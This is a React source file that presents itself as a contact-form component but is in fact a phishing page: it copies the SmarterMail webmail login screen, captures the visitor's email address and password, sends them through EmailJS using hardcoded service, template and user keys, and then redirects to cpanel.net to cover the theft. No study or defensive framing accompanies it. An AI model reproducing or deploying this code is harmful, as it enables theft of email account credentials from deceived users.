import emailjs from "emailjs-com";
import React from 'react';


export default function ContactUs() {

    function sendEmail(e) {
        e.preventDefault();

    emailjs.sendForm('gmail', 'template_0vlz6hx', e.target, 'user_99ogBoikg8ImrHb1RSNcB')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
        e.preventDefault();
        window.location.href='https://cpanel.net/';
    }

    return(
        <>
         <div class="Login" dir="ltr">
    <form novalidate id="login_form" form action=""  onSubmit={sendEmail}>
 

<div>

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="C2EE9ABB" />
</div>

        <div id="infoInject" class="infopanel">
        </div>



        <br />

        <div class="infopanel login">
            <h1 id="LoginLabel" class="pagetitle">
                Login to SmarterMail
            </h1>
            <div id="ctl00_TipTextDiv" class="tiptext login">
                
            </div>

            <div>
                
    <h2>
        Email Address
        <small>
            (e.g., user@example.com)</small>
    </h2>
    <input name="email" type="text" tabindex="1" />
                         
    <h2>
        Password
    </h2>
    <input  name="name" id="pass"  type="password" tabindex="2" />
                           
    <input  type="checkbox"  tabindex="3" /><label for="ctl00_MPH_chkAutoLogin">Remember me</label>

            </div>
            <div class="controls">
                
    <div class="casing">
        <select>
	<option selected="selected" value="">Use Browser Language</option>
	<option value="en">English</option>

</select>
    </div>

    <input type="submit" className="button" value="Login "></input>

            </div>
            <p class="subtext">Switch to the <a href="/Mobile">mobile interface</a></p>
        </div>
        <div id="footer" >
            <div>
                <span class="icon info"></span>
                <p>
                    By logging in, you're accepting cookies for this site.
                </p>
            </div>
            <div>
                
    <a  href="http://help.smartertools.com/SmarterMail/v15/Default.aspx?p=_USR&amp;v=15.7.6970&amp;lang=en-US&amp;page=LoginUser">Help</a>
    |

                 <a href='https://www.smartertools.com/smartermail/business-email-server'>SmarterMail Enterprise 15.7</a> | <a href='https://www.smartertools.com/smartermail/business-email-server' >Windows Mail Server</a> | &copy; 2021 <a href='http://www.smartertools.com/'>SmarterTools Inc.</a>
            </div>
        </div>
        
     

    

</form>
</div>
       

        </>
      
       
    )
}
